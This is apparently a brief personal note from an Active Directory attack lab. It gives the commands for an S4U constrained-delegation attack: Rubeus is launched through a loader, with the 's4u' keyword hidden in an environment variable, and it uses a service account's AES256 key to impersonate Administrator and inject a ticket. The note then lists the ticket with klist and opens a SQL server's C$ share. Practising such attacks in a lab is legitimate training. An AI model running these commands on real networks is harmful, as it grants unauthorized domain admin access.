[[priv-esc]]

```
echo %Pwn%
```
%pwn% = s4u
on student vm
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```
check if tgs is injected
```
klist  
```
access filesystem now
```
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```
